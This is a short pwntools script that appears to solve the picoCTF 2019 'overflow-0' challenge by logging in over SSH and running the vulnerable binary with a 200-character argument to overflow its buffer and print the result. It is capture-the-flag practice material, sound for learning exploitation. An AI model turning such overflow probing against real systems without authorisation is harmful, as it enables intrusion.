
from os import environ
from pwn import *

PATH='/problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a/'
EXEC=PATH+'vuln'
s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process([EXEC, "A"*200], cwd=PATH)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
